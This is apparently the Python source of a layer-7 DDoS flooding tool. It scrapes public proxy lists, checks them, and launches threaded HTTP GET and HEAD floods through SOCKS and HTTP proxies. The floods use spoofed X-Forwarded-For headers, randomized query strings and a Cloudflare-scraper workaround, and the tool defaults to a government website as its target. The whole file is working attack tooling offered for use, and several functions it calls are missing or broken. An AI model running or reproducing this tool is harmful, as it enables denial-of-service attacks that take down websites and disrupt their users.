class color:
   GREEN = '\033[92m'
   UNDERLINE = '\033[4m'
   END = '\033[0m'

l7 = ["FLARE", "HEADBUTT", "DARK"]
methods = l7
methodsl = l7

def spoofer():
    addr = [192, 168, 0, 1]
    d = '.'
    addr[0] = str(random.randrange(11, 197))
    addr[1] = str(random.randrange(0, 255))
    addr[2] = str(random.randrange(0, 255))
    addr[3] = str(random.randrange(2, 254))
    assemebled = addr[0] + d + addr[1] + d + addr[2] + d + addr[3]
    return assemebled


def start_attack(method, threads, event, socks_type):
    global out_file
    cmethod = str(method.upper())
    out_file = str("files/proxys/" + sys.argv[5])
    proxydl(out_file, socks_type)
    os.system('ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear')
    print("")
    print("")
    print(color.GREEN + "       ╔═══╗ ╔═══╗ ╔═══╗ ╔╗╔═╗ ╔═╗ ╔╗ ╔═══╗ ╔════╗     " + color.END)
    print(color.GREEN + "       ╚╗╔╗║ ║╔═╗║ ║╔═╗║ ║║║╔╝ ║ ╚╗║║ ║╔══╝ ║╔╗╔╗║     " + color.END)
    print(color.GREEN + "        ║║║║ ║║ ║║ ║╚═╝║ ║╚╝╝  ║╔╗╚╝║ ║╚══╗ ╚╝║║╚╝     " + color.END)
    print(color.GREEN + "        ║║║║ ║╚═╝║ ║╔╗╔╝ ║╔╗║  ║║╚╗ ║ ║╔══╝   ║║       " + color.END)
    print(color.GREEN + "       ╔╝╚╝║ ║╔═╗║ ║║║╚╗ ║║║╚╗ ║║ ║ ║ ║╚══╗   ║║       " + color.END)
    print(color.GREEN + "       ╚═══╝ ╚╝ ╚╝ ╚╝╚═╝ ╚╝╚═╝ ╚╝ ╚═╝ ╚═══╝   ╚╝       " + color.END)
    print(color.GREEN + "       ═══════════════════════════════════════════     " + color.END)
    print(color.GREEN + "       [URL]:     {}".format(target) + color.END)
    print(color.GREEN + "       [ZOMBIES]: {}".format(len(proxies)) + color.END)
    print(color.GREEN + "       [TIME]:    {}".format(sys.argv[7]) + color.END)
    print(color.GREEN + "       [USED]:    {}".format(method) + color.END)
    print(color.GREEN + "       ═══════════════════════════════════════════     " + color.END)
    print("")
    try:
        if method == "post":
            for _ in range(threads):
                threading.Thread(target=post, args=(event, socks_type), daemon=True).start()
        elif method == "get":
            for _ in range(threads):
                threading.Thread(target=http, args=(event, socks_type), daemon=True).start()
        elif method == "capb":
            for _ in range(threads):
                threading.Thread(target=capb, args=(event, socks_type), daemon=True).start()
        elif method == "dark":
            for _ in range(threads):
                threading.Thread(target=dark, args=(event, socks_type), daemon=True).start()
        elif method == "head":
            for _ in range(threads):
                threading.Thread(target=head, args=(event, socks_type), daemon=True).start()
        elif method == "headbutt":
            for _ in range(threads):
                threading.Thread(target=headbutt, args=(event, socks_type), daemon=True).start()
        elif method == "flare":
            for _ in range(threads):
                threading.Thread(target=flare, args=(event, socks_type), daemon=True).start()
                
    except:
        pass

def random_data():
    return str(Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings) + Choice(strings) + str(Intn(0, 271400281257)) + Choice(strings) + str(Intn(0, 271004281257)) + Choice(
        strings))


def Headers(method):
    header = ""
    if method == "get" or method == "head":
        connection = "Connection: Keep-Alive\r\n"
        accept = Choice(acceptall) + "\r\n"
        referer = "Referer: " + referers + target + path + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        useragent = "User-Agent: " + UserAgent + "\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "dark":
        connection = "Connection: null\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        referer = "Referer: null\r\n"
        useragent = "User-Agent: null\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    elif method == "headbutt":
        connection = "Connection: null\r\n"
        accept = Choice(acceptall) + "\r\n"
        connection += "Cache-Control: max-age=0\r\n"
        connection += "pragma: no-cache\r\n"
        connection += "X-Forwarded-For: " + spoofer() + "\r\n"
        referer = "Referer: null\r\n"
        useragent = "User-Agent: null\r\n"
        header = referer + useragent + accept + connection + "\r\n\r\n"
    return header

def UrlFixer(original_url):
    global target, path, port, protocol
    original_url = original_url.strip()
    url = ""
    path = "/"
    port = 80
    protocol = "http"
    if original_url[:7] == "http://":
        url = original_url[7:]
    elif original_url[:8] == "https://":
        url = original_url[8:]
        protocol = "https"
    tmp = url.split("/")
    website = tmp[0]
    check = website.split(":")
    if len(check) != 1:
        port = int(check[1])
    else:
        if protocol == "https":
            port = 443
    target = check[0]
    if len(tmp) > 1:
        path = url.replace(website, "", 1)

def stop():
    print('All Attacks Stopped !')
    os.system('pkill python*')
    exit()

def dark(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("dark")
    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def flare(event, socks_type):
    header = Headers("get")
    proxy = Choice(proxies).strip().split(":")
    get_host = "GET " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = get_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            cfscrape.create_scraper(sess=s)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()

def headbutt(event, socks_type):
    proxy = Choice(proxies).strip().split(":")
    header = Headers("headbutt")
    head_host = "HEAD " + path + "?" + random_data() + " HTTP/1.1\r\nHost: " + target + "\r\n"
    request = head_host + header
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.send(str.encode(request))
            except:
                s.close()
        except:
            s.close()


def cfbc(event, socks_type):
    request = Headers("flare")
    event.wait()
    while time.time() < timer:
        try:
            s = socks.socksocket()
            if socks_type == 4:
                s.set_proxy(socks.SOCKS4, str(proxy[0]), int(proxy[1]))
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.setsockopt(socket.IPPROTO_TCP, socket.TCP_NODELAY, 1)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            try:
                for _ in range(multiple):
                    s.sendall(str.encode(request))
            except:
                s.close()
        except:
            s.close()

socket_list = []
t = 0

def checking(lines, socks_type, ms):
    global nums, proxies
    proxy = lines.strip().split(":")
    if len(proxy) != 2:
        proxies.remove(lines)
        return
    err = 0
    while True:
        if err == 3:
            proxies.remove(lines)
            break
        try:
            s = socks.socksocket()
            if socks_type == 5:
                s.set_proxy(socks.SOCKS5, str(proxy[0]), int(proxy[1]))
            if socks_type == 1:
                s.set_proxy(socks.HTTP, str(proxy[0]), int(proxy[1]))
            s.settimeout(ms)
            s.connect((str(target), int(port)))
            if protocol == "https":
                ctx = ssl.SSLContext()
                s = ctx.wrap_socket(s, server_hostname=target)
            s.send(str.encode("GET / HTTP/1.1\r\n\r\n"))
            s.close()
            break
        except:
            err += 1
    nums += 1

nums = 0

def check_socks(ms):
    global nums
    thread_list = []
    for lines in list(proxies):
        if choice == "5":
            th = threading.Thread(target=checking, args=(lines, 5, ms,))
            th.start()
        if choice == "1":
            th = threading.Thread(target=checking, args=(lines, 1, ms,))
            th.start()
        thread_list.append(th)
        sleep(0.01)
    for th in list(thread_list):
        th.join()
    ans = "y"
    if ans == "y" or ans == "":
        if choice == "5":
            with open(out_file, 'wb') as fp:
                for lines in list(proxies):
                    fp.write(bytes(lines, encoding='utf8'))
            fp.close()
        elif choice == "1":
            with open(out_file, 'wb') as fp:
                for lines in list(proxies):
                    fp.write(bytes(lines, encoding='utf8'))
            fp.close()


def check_list(socks_file):
    temp = open(socks_file).readlines()
    temp_list = []
    for i in temp:
        if i not in temp_list:
            if ':' in i:
                temp_list.append(i)
    rfile = open(socks_file, "wb")
    for i in list(temp_list):
        rfile.write(bytes(i, encoding='utf-8'))
    rfile.close()

def downloadsocks(choice):
    global out_file
    if choice == "5":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=socks5&timeout=10000&country=all&ssl=all&anonymity=all", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=socks5", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=socks5", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roma8ok/proxy-list/main/proxy-list-socks5.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/socks5.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/SOCKS5_RAW.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/mmpx12/proxy-list/master/socks5.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-socks5.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/mcburn777/w0rksocks5/main/socks5.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/hookzof/socks5_list/master/proxy.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt", timeout=5)
            f.write(r.content)
            f.close()
        except:
            f.close()
    if choice == "1":
        f = open(out_file, 'wb')
        try:
            r = requests.get("https://api.proxyscrape.com/v2/?request=displayproxies&protocol=http&timeout=10000&country=all&ssl=all&anonymity=all", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxyscan.io/download?type=http", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=http", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://www.proxy-list.download/api/v1/get?type=https", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/Volodichev/proxy-list/main/http.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roma8ok/proxy-list/main/proxy-list-http.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roma8ok/proxy-list/main/proxy-list-https.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/http.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/ShiftyTR/Proxy-List/master/https.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/roosterkid/openproxylist/main/HTTPS_RAW.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/mmpx12/proxy-list/master/http.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/mmpx12/proxy-list/master/https.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/jetkai/proxy-list/main/online-proxies/txt/proxies-http%2Bhttps.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/clarketm/proxy-list/master/proxy-list-raw.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/mcburn777/pr0xw0rk/main/http.txt", timeout=5)
            f.write(r.content)
        except:
            pass
        try:
            r = requests.get("https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt", timeout=5)
            f.write(r.content)
            f.close()
        except:
            f.close()


def main():
    global proxies, multiple, choice, timer, out_file
    method = str(sys.argv[1]).lower()
    
    out_file = str("files/proxys/" + sys.argv[5])
    if not os.path.exists(out_file):
        makefile(out_file)

    if method == "check":
        proxydl(out_file, socks_type)
        exit()
    if method == "stop":
        url = str(sys.argv[2]).strip()
        UrlFixer(url)
        stop()
    elif (method == "help") or (method == "h"):
        usge()
    elif (method == "check"):
        pass
    elif str(method.upper()) not in str(methods):
        print(color.GREEN + "       ╔═══╗ ╔═══╗ ╔═══╗ ╔╗╔═╗ ╔═╗ ╔╗ ╔═══╗ ╔════╗     " + color.END)
        print(color.GREEN + "       ╚╗╔╗║ ║╔═╗║ ║╔═╗║ ║║║╔╝ ║ ╚╗║║ ║╔══╝ ║╔╗╔╗║     " + color.END)
        print(color.GREEN + "        ║║║║ ║║ ║║ ║╚═╝║ ║╚╝╝  ║╔╗╚╝║ ║╚══╗ ╚╝║║╚╝     " + color.END)
        print(color.GREEN + "        ║║║║ ║╚═╝║ ║╔╗╔╝ ║╔╗║  ║║╚╗ ║ ║╔══╝   ║║       " + color.END)
        print(color.GREEN + "       ╔╝╚╝║ ║╔═╗║ ║║║╚╗ ║║║╚╗ ║║ ║ ║ ║╚══╗   ║║       " + color.END)
        print(color.GREEN + "       ╚═══╝ ╚╝ ╚╝ ╚╝╚═╝ ╚╝╚═╝ ╚╝ ╚═╝ ╚═══╝   ╚╝       " + color.END)
        print(color.GREEN + "             ╔════════════════════════════╗            " + color.END)
        print(color.GREEN + "             ║  ERROR: METHOD NOT FOUND   ║            " + color.END)
        print(color.GREEN + "             ╚════════════════════════════╝            " + color.END)
        print('')
        exit()
    timer = int(time.time()) + int(sys.argv[7])
    url = str(sys.argv[2]).strip()
    UrlFixer(url)
    choice = str(sys.argv[3]).strip()
    if choice != "5" and choice != "1":
        print(color.GREEN + "       ╔═══╗ ╔═══╗ ╔═══╗ ╔╗╔═╗ ╔═╗ ╔╗ ╔═══╗ ╔════╗     " + color.END)
        print(color.GREEN + "       ╚╗╔╗║ ║╔═╗║ ║╔═╗║ ║║║╔╝ ║ ╚╗║║ ║╔══╝ ║╔╗╔╗║     " + color.END)
        print(color.GREEN + "        ║║║║ ║║ ║║ ║╚═╝║ ║╚╝╝  ║╔╗╚╝║ ║╚══╗ ╚╝║║╚╝     " + color.END)
        print(color.GREEN + "        ║║║║ ║╚═╝║ ║╔╗╔╝ ║╔╗║  ║║╚╗ ║ ║╔══╝   ║║       " + color.END)
        print(color.GREEN + "       ╔╝╚╝║ ║╔═╗║ ║║║╚╗ ║║║╚╗ ║║ ║ ║ ║╚══╗   ║║       " + color.END)
        print(color.GREEN + "       ╚═══╝ ╚╝ ╚╝ ╚╝╚═╝ ╚╝╚═╝ ╚╝ ╚═╝ ╚═══╝   ╚╝       " + color.END)
        print(color.GREEN + "             ╔════════════════════════════╗            " + color.END)
        print(color.GREEN + "             ║  ERROR: PROXY NOT FOUND.   ║            " + color.END)
        print(color.GREEN + "             ╚════════════════════════════╝            " + color.END)
        exit()
    if choice == "1":
        socks_type = 1
    else:
        socks_type = 5
    threads = int(sys.argv[4])
    proxies = open(out_file).readlines()
    if method == "slow":
        conn = threads
        proxydl(out_file, socks_type)
        print(color.GREEN + "       ╔═══╗ ╔═══╗ ╔═══╗ ╔╗╔═╗ ╔═╗ ╔╗ ╔═══╗ ╔════╗     " + color.END)
        print(color.GREEN + "       ╚╗╔╗║ ║╔═╗║ ║╔═╗║ ║║║╔╝ ║ ╚╗║║ ║╔══╝ ║╔╗╔╗║     " + color.END)
        print(color.GREEN + "        ║║║║ ║║ ║║ ║╚═╝║ ║╚╝╝  ║╔╗╚╝║ ║╚══╗ ╚╝║║╚╝     " + color.END)
        print(color.GREEN + "        ║║║║ ║╚═╝║ ║╔╗╔╝ ║╔╗║  ║║╚╗ ║ ║╔══╝   ║║       " + color.END)
        print(color.GREEN + "       ╔╝╚╝║ ║╔═╗║ ║║║╚╗ ║║║╚╗ ║║ ║ ║ ║╚══╗   ║║       " + color.END)
        print(color.GREEN + "       ╚═══╝ ╚╝ ╚╝ ╚╝╚═╝ ╚╝╚═╝ ╚╝ ╚═╝ ╚═══╝   ╚╝       " + color.END)
        print(color.GREEN + "       ═══════════════════════════════════════════     " + color.END)
        print(color.GREEN + "       [URL]:     {}".format(target) + color.END)
        print(color.GREEN + "       [ZOMBIES]: {}".format(len(proxies)) + color.END)
        print(color.GREEN + "       [TIME]:    {}".format(sys.argv[7]) + color.END)
        print(color.GREEN + "       [USED]:    {}".format(method) + color.END)
        print(color.GREEN + "       ═══════════════════════════════════════════     " + color.END)
        print("")

        for _ in range(conn):
            threading.Thread(target=slow, args=(conn, socks_type), daemon=True).start()
    else:
        multiple = str((sys.argv[6]))
        if multiple == "":
            multiple = int(100)
        else:
            multiple = int(multiple)
        event = threading.Event()
        start_attack(method, threads, event, socks_type)
        event.clear()
        event.set()
    while True:
        try:
            sleep(0.1)
        except KeyboardInterrupt:
            break


def proxydl(out_file, socks_type):
    global proxies, multiple, choice, data
    ms = 3
    if socks_type == 1:
        socktyper = "HTTP"
    if socks_type == 5:
        socktyper = "SOCKS5"
    os.system('ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear')
    print("")
    print("")
    print(color.GREEN + "       ╔═══╗ ╔═══╗ ╔═══╗ ╔╗╔═╗ ╔═╗ ╔╗ ╔═══╗ ╔════╗     " + color.END)
    print(color.GREEN + "       ╚╗╔╗║ ║╔═╗║ ║╔═╗║ ║║║╔╝ ║ ╚╗║║ ║╔══╝ ║╔╗╔╗║     " + color.END)
    print(color.GREEN + "        ║║║║ ║║ ║║ ║╚═╝║ ║╚╝╝  ║╔╗╚╝║ ║╚══╗ ╚╝║║╚╝     " + color.END)
    print(color.GREEN + "        ║║║║ ║╚═╝║ ║╔╗╔╝ ║╔╗║  ║║╚╗ ║ ║╔══╝   ║║       " + color.END)
    print(color.GREEN + "       ╔╝╚╝║ ║╔═╗║ ║║║╚╗ ║║║╚╗ ║║ ║ ║ ║╚══╗   ║║       " + color.END)
    print(color.GREEN + "       ╚═══╝ ╚╝ ╚╝ ╚╝╚═╝ ╚╝╚═╝ ╚╝ ╚═╝ ╚═══╝   ╚╝       " + color.END)
    print(color.GREEN + "             ╔════════════════════════════╗            " + color.END)
    print(color.GREEN + "             ║  CONNECTING TO DARKNET...  ║            " + color.END)
    print(color.GREEN + "             ╚════════════════════════════╝            " + color.END)
    print('')
    downloadsocks(choice)
    proxies = open(str(out_file)).readlines()
    check_list(out_file)
    check_socks(ms)


bds = 0

def usgeaseets():
    global metho, url, SOCKST, thr, proxylist, muli, tim, l7s
    socks = ["1", "5"]
    sockst = ["socks5.txt", "http.txt"]
    try:
        if sys.argv[3] not in socks:
            SOCKST = Choice(socks)
        elif sys.argv[3]:
            SOCKST = sys.argv[3]

        else:
            SOCKST = Choice(socks)
    except:
        SOCKST = Choice(socks)

    if (str(SOCKST) == str('1')):
        proxylist = "http.txt"
    else:
        proxylist = "socks{0}.txt".format(SOCKST)

    try:
        met = str(sys.argv[1]).upper()
        if met not in list(methods):
            metho = Choice(methods).lower()
        elif sys.argv[1]:
            metho = sys.argv[1]
        else:
            metho = Choice(methods).lower()
    except:
        metho = Choice(methods).lower()
    try:
        methos = metho.upper()
        if str("http") not in sys.argv[2]:
            url = "https://gov.ph"
        elif sys.argv[2]:
            url = sys.argv[2]
        else:
            url = "https://gov.ph"
    except:
        url = "https://gov.ph"
    try:
        if sys.argv[4]:
            thr = sys.argv[4]
        else:
            thr = Intn(100, 1000)
    except:
        thr = Intn(10, 1000)
    try:
        if (sys.argv[5] not in sockst):
            exit()
    except IndexError:
        pass
    except:
        print('socks type not found')
        exit()

    try:
        if sys.argv[6]:
            muli = sys.argv[6]
        else:
            muli = Intn(5, 100)
    except:
        muli = Intn(5, 100)
    try:
        if sys.argv[7]:
            tim = sys.argv[7]
        else:
            tim = Intn(10, 10000)
    except:
        tim = Intn(10, 10000)

    l7s = str(l7).replace("'", "").replace("[", "").replace("]", "")


def usge():
    usgeaseets()
    os.system('ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && ulimit -n 999999 && clear && clear')
    print("")
    print("")
    print(color.GREEN + "       ╔═══╗ ╔═══╗ ╔═══╗ ╔╗╔═╗ ╔═╗ ╔╗ ╔═══╗ ╔════╗     " + color.END)
    print(color.GREEN + "       ╚╗╔╗║ ║╔═╗║ ║╔═╗║ ║║║╔╝ ║ ╚╗║║ ║╔══╝ ║╔╗╔╗║     " + color.END)
    print(color.GREEN + "        ║║║║ ║║ ║║ ║╚═╝║ ║╚╝╝  ║╔╗╚╝║ ║╚══╗ ╚╝║║╚╝     " + color.END)
    print(color.GREEN + "        ║║║║ ║╚═╝║ ║╔╗╔╝ ║╔╗║  ║║╚╗ ║ ║╔══╝   ║║       " + color.END)
    print(color.GREEN + "       ╔╝╚╝║ ║╔═╗║ ║║║╚╗ ║║║╚╗ ║║ ║ ║ ║╚══╗   ║║       " + color.END)
    print(color.GREEN + "       ╚═══╝ ╚╝ ╚╝ ╚╝╚═╝ ╚╝╚═╝ ╚╝ ╚═╝ ╚═══╝   ╚╝       " + color.END)
    print(color.GREEN + "             ║ LAYER 7 - LIFETIME EDITION ║            " + color.END)
    print(color.GREEN + "             ╚════════════════════════════╝            " + color.END)
    print('')

def makefile(text):
    if text == "files/":
        os.mkdir(text)
    elif text == "files/proxys/":
        os.mkdir(text)
    else:
        open(text, 'w').close()
    print('File: ', text)

if __name__ == '__main__':
    import os, requests, socket, socks, time, random, threading, sys, ssl, datetime, cfscrape, re
    from time import sleep
    from icmplib import ping as pig
    from scapy.layers.inet import TCP
    from scapy.all import *
    from socket import gaierror
    from discord_webhook import DiscordWebhook
    acceptall = [
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept-Encoding: gzip, deflate",
        "Accept-Language: en-US,en;q=0.5Accept-Encoding: gzip, deflate",
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5Accept-Charset: iso-8859-1Accept-Encoding: gzip",
        "Accept: application/xml,application/xhtml+xml,text/html;q=0.9, text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1Accept-Charset: utf-8, iso-8859-1;q=0.5",
        "Accept: image/jpeg, application/x-ms-application, image/gif, application/xaml+xml, image/pjpeg, application/x-ms-xbap, application/x-shockwave-flash, application/msword, */*Accept-Language: en-US,en;q=0.5",
        "Accept: text/html, application/xhtml+xml, image/jxr, */*Accept-Encoding: gzipAccept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xml;q=0.9, application/xhtml+xml, image/png, image/webp, image/jpeg, image/gif, image/x-xbitmap, */*;q=0.1Accept-Encoding: gzipAccept-Language: en-US,en;q=0.5Accept-Charset: utf-8, iso-8859-1;q=0.5,"
        "Accept: text/html, application/xhtml+xml, application/xml;q=0.9, */*;q=0.8Accept-Language: en-US,en;q=0.5",
        "Accept-Charset: utf-8, iso-8859-1;q=0.5Accept-Language: utf-8, iso-8859-1;q=0.5, *;q=0.1",
        "Accept: text/html, application/xhtml+xml",
        "Accept-Language: en-US,en;q=0.5",
        "Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8Accept-Encoding: br;q=1.0, gzip;q=0.8, *;q=0.1",
        "Accept: text/plain;q=0.8,image/png,*/*;q=0.5Accept-Charset: iso-8859-1",
    ]

    data = ""
    strings = "asdfghjklqwertyuiopZXCVBNMQWERTYUIOPASDFGHJKLzxcvbnm1234567890"
    Intn = random.randint
    Choice = random.choice
    if not os.path.exists('files/'):
        makefile('files/')
    if not os.path.exists('files/proxys/'):
        makefile('files/proxys/')
    if not os.path.exists('files/useragent.txt'):
        makefile('files/proxys/useragent.txt')
    if not os.path.exists('files/ntp_servers.txt'):
        makefile('files/ntp_servers.txt')
    if not os.path.exists('files/memcached_servers.txt'):
        makefile('files/memcached_servers.txt')
    if not os.path.exists('files/referers.txt'):
        makefile('files/referers.txt')
    try:
        with open("files/useragent.txt", "r") as f:
            readuser = str(f.readlines()).replace('\n', '').replace('\r', '')
        with open("files/referers.txt", "r") as f:
            readref = str(f.readlines()).replace('\n', '').replace('\r', '')
        with open("files/memcached_servers.txt", "r") as f:
            memsv = str(f.readlines()).replace('\n', '').replace('\r', '')
        with open("files/ntp_servers.txt", "r") as f:
            ntpsv = str(f.readlines()).replace('\n', '').replace('\r', '')
        UserAgent = Choice(readuser)
        referers = Choice(readref)
        memcached_servers = Choice(memsv)
        try:
            bdr = "test"
            if bdr == "tools":
                tools()
            elif bdr == "stop":
                stop()
            elif bdr == "help":
                usge()
            else:
                main()
        except IndexError:
            usge()
    except KeyboardInterrupt:
        sys.exit()
    except IndexError:
        usge()